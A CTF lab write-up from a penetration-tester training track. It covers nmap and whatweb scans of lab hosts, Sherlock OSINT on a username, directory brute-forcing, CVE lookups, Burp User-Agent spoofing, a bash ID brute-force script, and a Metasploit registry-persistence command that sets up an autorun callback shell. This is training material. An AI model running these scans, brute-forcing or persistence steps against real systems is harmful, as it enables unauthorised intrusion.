---
id: "68f26000a7105663518df054"
title: "CyberTalents-ITI Penetration Tester Track 2025"
projectId: "687e32493aa4a0e5086a2992"
guideSlug: "abdelwahabshandy-notes"
versionSlug: "v1.0"
path: "/penetration-testing-trainee/labs/iti-penetration-tester-track-2025"
status: "PUBLISHED"
visibility: "PUBLIC"
format: "MDX"
contentSource: "published"
createdAt: "2025-10-17T15:25:52.496Z"
updatedAt: "2026-01-25T15:35:47.035Z"
---

# LABs

***

# **Introduction to CTF :**

## competition

Description :

Special kind of cybersecurity competition designed to challenge its participants to solve computer security problems : `ctf`

***

# Introduction to Penetration testing :

## Silent Look

Description :

Gathering as much information as possible without establishing contact between the pen tester and the target which you are collecting information : `Passive Information Gathering`

I solved it before here in the <a target="_blank" href="https://medium.com/@abdelwahabshandy/general-information-cybertalents-cbc059980a00">General Information</a> section.

***

# Introduction to Kali Linux

1. ## Distribution

Debian-based distribution with a collection of security and forensics tools. It features timely security updates, support for the ARM architecture

The flag without spaces : `KaliLinux`

2. ## S3cret

**I need to remove a file called s3cret in my home directory. which command should i use :** `rm ~/s3cret`

3. ## Linuxcmd 101

**This Challenge will help you understand essential commands in Linux OS**

Each point is linked to another point, connect the link and win the Flag!

[**https://hubchallenges.s3.eu-west-1.amazonaws.com/Forensics/linux\_chal.tar.gz**](https://hubchallenges.s3.eu-west-1.amazonaws.com/Forensics/linux_chal.tar.gz)

```bash
$ wget https://hubchallenges.s3.eu-west-1.amazonaws.com/Forensics/linux_chal.tar.gz
--2025-10-17 15:48:20--  https://hubchallenges.s3.eu-west-1.amazonaws.com/Forensics/linux_chal.tar.gz
Resolving hubchallenges.s3.eu-west-1.amazonaws.com (hubchallenges.s3.eu-west-1.amazonaws.com)... 3.5.69.6, 3.5.64.212, 52.92.4.66, ...
Connecting to hubchallenges.s3.eu-west-1.amazonaws.com (hubchallenges.s3.eu-west-1.amazonaws.com)|3.5.69.6|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20851 (20K) [application/x-gzip]
Saving to: ‘linux_chal.tar.gz’

linux_chal.tar.gz      100%[=========================>]  20.36K  --.-KB/s    in 0.01s   

2025-10-17 15:48:21 (1.40 MB/s) - ‘linux_chal.tar.gz’ saved [20851/20851]
```

After download :

```bash
# 1. Unpack tar
tar -xvf linux_chal.tar.gz

# 2. Unpack exec.zip using .pass.txt
7z x exec.zip -p"$(cat .pass.txt)"

# 3. Run the file "-" to get the ascii.zip password
./-
7z x ascii.zip -p"$(./-)"

# 4. Unpack size37.zip using f6 as the password
# (F6 contains ascii text)
file *
cat f6
7z x size37.zip -p"$(cat f6)"

# 5. Set the password for next.zip
cat test* > pass
grep -oP 'this.*?file' pass
# Use the entire extracted line as the password
7z x next.zip -p "thissssisssthepasswordfornexxtfileeee"

# 6. Inside next/: Extract the word NumberOne.zip from the line containing cybertalents
cat next/nexttocybertalents | grep -i cybertalents
# Extract the part: "orderby1337"
7z x NumberOne.zip -p "orderby1337"

# 7. Go to NumberOne, prepare the hash decodeme1.zip
zip2john decodeme1.zip > hash_decodeme1
john --wordlist=one hash_decodeme1
# John detects the word: rocky
7z x decodeme1.zip -p "rocky" -odecodeme1_extracted -y

# 8. Open and decode the pass (Base64)
cat decodeme1_extracted/decodeme1/pass | base64 -d
# Give: usemeaspassword

# 9. Decode decodeme2.zip
7z x decodeme1_extracted/decodeme1/decodeme2.zip -p "usemeaspassword" -odecodeme2_extracted -y

# 10. Display flag and decode ROT13
cat decodeme2_extracted/decodeme2/flag.txt
# Shows: synt{f1zcyr_yvahk_101}
# Decode ROT13
echo "synt{f1zcyr_yvahk_101}" | tr 'A-Za-z' 'N-ZA-Mn-za-m' #OR Using CyberChef
# Output: flag{s1mple_linux_101}
```

Flag : `flag{s1mple_linux_101}`

***

# **Reconnaissance (2/2)**

1. ## version :

* **Challenge IP:54.219.206.144**

* **This Challenge will help you understand to define the version of the web service**

* Can you find the webserver version

* Flag format Xxxxxxy.y.yy

* example: Nginx3.4.11

  Objective :

> To determine the web server version on the target device with IP address 54.219.206.144.

```bash
whatweb 54.219.206.144
http://54.219.206.144 [200 OK] Apache[2.4.29][Default], Country[UNITED STATES][US], HTTPServer[Unix][Apache/2.4.29 (Unix)], IP[54.219.206.144]
```

> The whatweb 54.219.206.144 command sends HTTP requests to the address and parses the responses (headers, content, paths) to reveal site technologies — web server, CMS, frames, and possible versions.

```bash
nmap -sV -p80,443 54.219.206.144
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 16:37 EDT
Nmap scan report for ec2-54-219-206-144.us-west-1.compute.amazonaws.com (54.219.2
Host is up (0.019s latency).

PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.4.29 ((Unix))
443/tcp filtered https

Service detection performed. Please report any incorrect results at https://nmap.
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

> nmap is a tool for scanning networks and discovering devices, ports, and services on target machines.
>
> -sV (Service/version detection) attempts to discover which service is running on each port (e.g., HTTP, SSH) and its version (e.g., Apache 2.4.29). nmap sends a series of requests/probes to open ports and then analyzes the responses to match them against its database of service fingerprints.
>
> flag : `Apache2.4.29`

## 2.Invincible

**This Challenge will help you understand the basics of OSINT**

Our threat intelligence team has noticed suspicious behavior from the user "soremanzo" , Can you trace him and find what he is trying to hide

This means we're looking for any hidden information or links between his accounts, his real identity (name/email), private/leaked repositories, wallet/server addresses, or suspicious activity.

I used several tools including dig, whoami, shodan, and sherlock.

Sherlock gave a positive result :

```bash
sherlock soremanzo 
Update available! 0.15.0 --> 0.16.0
https://github.com/sherlock-project/sherlock/releases/tag/v0.16.0
[*] Checking username soremanzo on:

[+] Coders Rank: https://profile.codersrank.io/user/soremanzo/
[+] Disqus: https://disqus.com/soremanzo
[+] Envato Forum: https://forums.envato.com/u/soremanzo
[+] GNOME VCS: https://gitlab.gnome.org/soremanzo
[+] HackenProof (Hackers): https://hackenproof.com/hackers/soremanzo
[+] LibraryThing: https://www.librarything.com/profile/soremanzo
[+] NationStates Nation: https://nationstates.net/nation=soremanzo
[+] NationStates Region: https://nationstates.net/region=soremanzo
[+] Patched: https://patched.sh/User/soremanzo
[+] Slack: https://soremanzo.slack.com
[+] Splice: https://splice.com/soremanzo
[+] Spotify: https://open.spotify.com/user/soremanzo
[+] Telegram: https://t.me/soremanzo
[+] Weblate: https://hosted.weblate.org/user/soremanzo/
[+] YandexMusic: https://music.yandex/users/soremanzo/playlists
[+] phpRU: https://php.ru/forum/members/?username=soremanzo
[+] svidbook: https://www.svidbook.ru/user/soremanzo

[*] Search completed with 17 results
                                          
```

I started searching on Google Dork for each website separately:

```bash
site:forums.envato.com" soremanzo"
# try in google....
soremanzo" blog" # out in Searching
```

This is the only one that got a result, almost:

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762037712340/fcbae629-40b6-46b3-b5c2-d56d12bdeacc.png" alt="" align="center" fullwidth="true" />

[`https://disqus.com/by/soremanzo/`](https://disqus.com/by/soremanzo/) :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762038755682/5d68ed6c-a1ae-4af7-8a53-efdc606bba32.png" alt="" align="center" fullwidth="true" />

Of course, here we will use: [https://web.archive.org/](https://web.archive.org/) :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762039234442/d21d3087-bbdc-44b2-97cb-daefd5bd1c22.png" alt="" align="center" fullwidth="true" />

> ## **Note**
>
> This calendar view maps the number of times [**https://disqus.com/by/soremanzo/**](https://disqus.com/by/soremanzo/) was crawled by the Wayback Machine, *not* how many times the site was actually updated. More info in the [FAQ](https://help.archive.org/help/category/the-wayback-machine/).
>
> * Green indicates redirects (3xx).

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762039491992/b87505db-e264-4add-ae93-5b101a3bc56c.png" alt="" align="center" fullwidth="true" />

I looked at the date after it, not the one before it; that's a trick :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762039837098/85601935-4fe7-4cf8-bfea-c4777a901066.png" alt="" align="center" fullwidth="true" />

flag : `FLAG{4rch1v3_Usu4LLy_C0nt41n_Us3fuL_1nf0rm4t10n}`

***

# **Scanning**

## Open Doors

**This Challenge will help you understand basic port scanning**

**How Many ports under 100 are opened in the targets**

Objective: To learn how to scan the device/host's ports, identify which ports are open, and prepare the required answer.

Here's the question: How many ports below 100 are open on the target? Then, convert the port results into flag format by taking the MD5 from the list.

```bash
nmap -sS -sV -p 1-100 --open 52.53.161.8
```

> This command performed the following:
>
> -sS = TCP SYN scan (fast and common),
>
> -sV = Detect service versions,
>
> -p 1-100 = Scan ports 1-100,
>
> \--open = Show only open results.

```bash
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
25/tcp open  tcpwrapped
80/tcp open  http       Apache httpd 2.4.29 ((Unix))
```

> * An open SSH port running OpenSSH 8.9p1 on Ubuntu. This provides information about the service and its authentication access.
>
> * An open HTTP port running Apache 2.4.29 on Unix. This matches what was previously detected in another scan (whatweb/nmap). The presence of version 2.4.29.
>
> * Port 25 tcpwrapped means the port is responsive, but nmap couldn't decode the service because it's enclosed in a protected control/banner view or requires a special session/handshake. This usually indicates that the port might be SMTP (port 25 is common for SMTP), but the service might be protected by a firewall.

Don't rush to solve it assuming there are 3 ports. There are actually 2, not 3. The reason is that port 25 has the phrase "tcpwrapped," which means the port is responding to the connection but is protected.

```bash
echo -n "2" | md5sum
c81e728d9d4c2f636f067f89cc14862c  -
```

And that's it , Done flag : `c81e728d9d4c2f636f067f89cc14862c`

***

# **Enumeration**

## hidden :

Can you find the **hidden** directory on the target web app?

flag is just the directory name

I said, "Let me look at the page."

```bash
http://54.193.20.53
```

To search for hidden evidence using

```bash
gobuster dir -u http://54.193.20.53 -w /usr/share/wordlists/dirb/common.txt
#OR
dirb http://54.193.20.53
```

I found this :

```bash
http://54.193.20.53/secret/ ... It works!
This is the default web page for this server.

The web server software is running but no content has been added, yet.
```

the flag : `secret`

***

# **Vulnerability Assessment**

1. ## CVE Number

What is the CVE ID that is related to EternalBlue

**Flag Format: XXX-XXXX-XXXX**

I solved it before here in the <a target="_blank" href="https://medium.com/@abdelwahabshandy/general-information-cybertalents-cbc059980a00">General Information</a> section.

But let's solve it, by searching on Google:

```bash
eternalblue "cve"
```

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762048087410/c17f4444-51a0-434e-9274-a7cf93c1404f.png" alt="" align="center" fullwidth="true" />

It's not a big deal, but the important thing is to try.

Flag : `CVE-2017-0144`

2. ## remote-CVE

What’s CVE ID could be used against the web application in the below target

Note: its an unauthenticated RCE vulnerability.

using

```bash
whatweb http://cdlemxj6zq8ms639ye435wj7t8z5xj6zqd1g4c639-web.cybertalentslabs.com/
|
http://cdlemxj6zq8ms639ye435wj7t8z5xj6zqd1g4c639-web.cybertalentslabs.com/ [200 OK] Content-Language[en], Country[UNITED STATES][US], Drupal, HTTPServer[nginx/1.27.1], IP[13.64.8.64], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[7.0.28], PasswordField[pass], Script[text/javascript], Title[Welcome to ct2021 | ct2021], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.0.28], nginx[1.27.1]                         
```

> whatweb showed: Drupal 7 (MetaGenerator\[Drupal 7])

Since it says in the note an unauthenticated RCE vulnerability, we grab everything that is supported with Version and run a search with it , In the end, I arrived :

> Drupal 7 (MetaGenerator\[Drupal 7])

By doing a simple search on Google:

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762118485095/e64935d6-e620-4d19-812d-e0d62925b85f.png" align="center" fullwidth="false" />

> Flag : `CVE-2018-7600`

***

# **Introduction to Web Security**

## Reward :

**I receive a reward or mentioned on a wall of fame when i found vulnerability . I am participating in ..... program? Format of Flag ( Do not use spaces)**

I solved it before here in the <a target="_blank" href="https://medium.com/@abdelwahabshandy/general-information-cybertalents-cbc059980a00">General Information</a> section.

> flag : bugbounty

***

# **Web Application Basics**

## The Restricted Sessions

**Flag is restricted to logged users only , can you be one of them.**

```xml
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Sessions</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script type="text/javascript">
      var cu = null;
    </script>
  </head>
  <body>

    <div class="container">
      <h1>Welcome to sessions valley</h1>
      <hr />
              <h2>You are not logged-in so you don't have any flag to view</h2>
            <h3>Flag: NULL</h3>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <script type="text/javascript">

      if(document.cookie !== ''){
        $.post('getcurrentuserinfo.php',{
          'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
        },function(data){
          cu = data;
        });
      }
    </script>
  </body>
</html>
```

The JS on the page does a simple thing :

```javascript
if(document.cookie !== ''){
  $.post('getcurrentuserinfo.php',{
    'PHPSESSID':document.cookie.match(/PHPSESSID=([^;]+)/)[1]
  },function(data){
    cu = data;
  });
}
```

If the browser has a cookie named PHPSESSID, its value (the text inside the cookie) is sent via POST to getcurrentuserinfo.php.

The server responds with the current user information (cu), which is the flag.... Sprinkle a little then

On the other hand, it means: The application displays the flag for registered users only. But the mechanism for identifying the user depends on the value you send in the cookie or in the POST (PHPSESSID) and/or the existence of a cookie named UserInfo

Use Burp: Sending random cookies via Burp: I tried sending different PHPSESSID values to getcurrentuserinfo.php.

***

# **Burp Suite**

## Birdsweet

**I am tired of using firefox, so I made birdsweet!**

He tells you that he is tired of using Firefox and created birdsweet for himself, so ask yourself what type of browser it is:

```xml

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Birdsweet</title>
    <!-- Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
	<style>
		body {
		background-image: url('https://i.ytimg.com/vi/_-yAPTBYYnw/maxresdefault.jpg');
		background-size: cover;
		background-repeat: no-repeat;
		background-position: center center;
		height: 100vh;
		}
		.container {
			margin-top: 100px;
			background-color: rgba(255, 255, 255, 0.8);
			padding: 20px;
		}
	</style>
</head>
<body>
    <div class="container">
        <h1 class="text-center mt-2">
            <span class="badge badge-primary">birdsweet</span>
        </h1>
		<p class="lead text-center">This website only works if you have the birdsweet browser (or an IQ of 130+)</p>    </div>
    <!-- Bootstrap JS and dependencies -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>

</body>
</html>
```

Use Burp , on tab Proxy => intercept on :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762123930425/0ca4ff58-af51-44ff-b488-fc527e1d6cfa.png" align="center" fullwidth="false" />

the request :

```xml
GET / HTTP/1.1
Host: cdlemxwl32dxfe3e6l2z7x2dimz50j6zqd1g4c639-web.cybertalentslabs.com
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

change User-Agent : **birdsweet**

Change All Request Mozilla To **<mark>birdsweet</mark>**

```xml
GET /?id=1 HTTP/1.1
Host: cdlemxwl32dxfe3e6l2z7x2dimz50j6zqd1g4c639-web.cybertalentslabs.com
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: birdsweet/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cdlemxwl32dxfe3e6l2z7x2dimz50j6zqd1g4c639-web.cybertalentslabs.com/?id=1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Result :

<Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1762123362891/7ce5b502-3355-4bac-93f5-76573e6e1dc7.png" align="center" fullwidth="false" />

Change ID , But the story is that I try any numbers. You can try it yourself, but I will try it with a simple script (With the help of AI at some points because there were some errors):

```bash
#!/bin/bash

# Configuration
URL="http://cdlemxwl32dxfe3e6l2z7x2dimz50j6zqd1g4c639-web.cybertalentslabs.com/"
USER_AGENT="birdsweet"

echo "Starting ID Brute-force (2 to 1000)..."

# Loop from ID 2 up to 1000
for id_val in $(seq 2 1000); do
    
    # Construct the curl command
    CMD="curl -s -A \"$USER_AGENT\" \"${URL}?id=${id_val}\""
    
    # Execute the command and capture the output
    OUT=$(eval $CMD)
    
    # Check if the response is DIFFERENT from the expected failure message
    if ! echo "$OUT" | grep -q "No flag here"; then
        
        echo "****************************************************************"
        echo "!!! POTENTIAL SUCCESS: ID = $id_val !!!"
        echo "****************************************************************"
        
        # Search for common flag formats (CTF{}, flag{}, CYBERTALENTS{})
        if echo "$OUT" | egrep -o "CTF\{[^}]+\}|CYBERTALENTS\{[^}]+\}|flag\{[^}]+\}"; then
            echo "--- FOUND FLAG ---"
            echo "$OUT" | egrep -o "CTF\{[^}]+\}|CYBERTALENTS\{[^}]+\}|flag\{[^}]+\}"
        else
            # If no flag format found, print the section where the old message was
            echo "--- RESPONSE BODY SNIPPET (No 'No flag here' message found) ---"
            # Attempt to extract the content near the message area for inspection
            echo "$OUT" | grep -A 2 -B 2 '</a>'
        fi
        
        # Stop execution once a different ID is found, as it likely contains the flag.
        exit 0
    fi
done

echo "Done. Flag not found between ID 2 and 1000."
```

> USER\_AGENT → User-Agent string that will be sent with each request.
>
> loop for id\_val in $(seq 2 1000); do → pass through values ​​from 2 to 1000 (trying each value as id).
>
> Examines the output: if it does not contain the text "No flag here" this is considered a different response (possible indicator of success).
>
> When there is a different response, it prints a warning/success message with the ID number.
>
> If no flag is found, a clip of the response body is displayed near the \</a> element to review what has changed.
>
> The script stops (exit 0) at the first different result (assuming it is probable).

OutPut :

```bash
chmod +x ID_Bruteforcer.sh 
|
./ID_Bruteforcer.sh   
Starting ID Brute-force (2 to 1000)...
****************************************************************
!!! POTENTIAL SUCCESS: ID = 26 !!!
****************************************************************
--- RESPONSE BODY SNIPPET (No 'No flag here' message found) ---
            <span class="badge badge-primary">birdsweet</span>
        </h1>
                <p class="lead text-center">I see that you are a kid of our cultrue</p><p class="lead text-center">If I remember correctly this button will take you to the flag, but i think it is broken</p><a href="?id=1" class="btn btn-primary d-block mx-auto" style="width: fit-content;">Flag</a><p class="lead text-center">Oh yeah a flag. But it doesnt look right: 526d78685a33745251305a425457706b54314e55576d785352334252596a4a3452465a7064466c5256546c71546b566f54465a724d567058526c557859556857546b7836614556564d303575576c644f4d465236546c526b565739345a4668734e45314556545653626b5a49546d3573565656566448526a4d6e427a55573035566c52466545526862466c3556556434643170755a7a4e4f626d5268596d314e4d6d4a58597a6c5156453571576b6446655670585558645a616b4578543152724d3039555454313943673d3d</p>    </div>
    <!-- Bootstrap JS and dependencies -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
```

Using Manual Request : ID = 26 , Don't forget to change the User Agent :

Flag : Flag\{QCFAMWZyR25JMEdRNHArMFRNY2dENXlmTjF0TWZySitPWUY3R1BobnRtTldsR1d6VytjK1JWVlFhbnMrLys4eVJTUnorODVFYmxVcjU3TS9nOWZRbTJqenc9PTk2NGZjN2M1Njk0MGMzNjU=}Answer Flag\{QCFAMWZyR25JMEdRNHArMFRNY2dENXlmTjF0TWZySitPWUY3R1BobnRtTldsR1d6VytjK1JWVlFhbnMrLys4eVJTUnorODVFYmxVcjU3TS9nOWZRbTJqenc9PTk2NGZjN2M1Njk0MGMzNjU=}

***

# **Traffic Analysis**

## Capture

**Network analysis tool used to captured packets and present it in readable format**

I solved it before here in the <a target="_blank" href="https://medium.com/@abdelwahabshandy/general-information-cybertalents-cbc059980a00">General Information</a> section.

> flag : Wireshark

***

# **Persistence**

## Persistence :

> You want to achieve persistence using Meterpreter’s persistence module by creating an autorun registry file and getting a shell automatically every time the user restarts the PC
>
> Persistence options 
>
> Minutes after restarting the system: 7 
>
> Your Local port: 1337
>
> Your local host IP: 192.168.0.177

**Flag format is: xxx xxxxxxx/xxxxxxx/xxxxx/xxxxxxxx\_xxxxxxxxxxx xxxxx\_xxxx=xxx  xxxxx=xxxx xxxxx=**[**xxx.xxx.x.xxx**](http://xxx.xxx.x.xxx)

```bash
msfconsole
```

```bash
msf6 > search persistence windows

Matching Modules
================

   #   Name                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                       ---------------  ----       -----  -----------
   0   exploit/windows/local/ps_wmi_exec                          2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   1   exploit/windows/local/linqpad_deserialization_persistence  2024-12-03       normal     Yes    LINQPad Deserialization Exploit
   2   exploit/multi/local/obsidian_plugin_persistence            2022-09-16       excellent  Yes    Obsidian Plugin Persistence
   3     \_ target: Auto                                          .                .          .      .
   4     \_ target: Linux                                         .                .          .      .
   5     \_ target: OSX                                           .                .          .      .
   6     \_ target: Windows                                       .                .          .      .
   7   exploit/windows/local/vss_persistence                      2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   8   post/windows/manage/sshkey_persistence                     .                good       No     SSH Key Persistence
   9   post/windows/manage/sticky_keys                            .                normal     No     Sticky Keys Persistence Module
   10    \_ action: ADD                                           .                .          .      Add the backdoor to the target.
   11    \_ action: REMOVE                                        .                .          .      Remove the backdoor from the target.
   12  exploit/windows/local/wmi_persistence                      2017-06-06       normal     No     WMI Event Subscription Persistence
   13  post/windows/gather/enum_ad_managedby_groups               .                normal     No     Windows Gather Active Directory Managed Groups
   14  post/windows/manage/persistence_exe                        .                normal     No     Windows Manage Persistent EXE Payload Installer
   15  exploit/windows/local/s4u_persistence                      2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   16  exploit/windows/local/persistence                          2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   17  exploit/windows/local/persistence_service                  2018-10-20       excellent  No     Windows Persistent Service Installer
   18  exploit/windows/local/registry_persistence                 2015-07-01       excellent  Yes    Windows Registry Only Persistence
   19  exploit/windows/local/persistence_image_exec_options       2008-06-28       excellent  No     Windows Silent Process Exit Persistence


Interact with a module by name or index. For example info 19, use 19 or use exploit/windows/local/persistence_image_exec_options
```

* 16 , Any Way You Can See this section :

* I solved it before here in the <a target="_blank" href="https://medium.com/@abdelwahabshandy/general-information-cybertalents-cbc059980a00">General Information</a> section.

Flag : `run exploit/windows/local/registry_persistence SLEEP_TIME=420 LPORT=1337 LHOST=192.168.0.177`

***

#

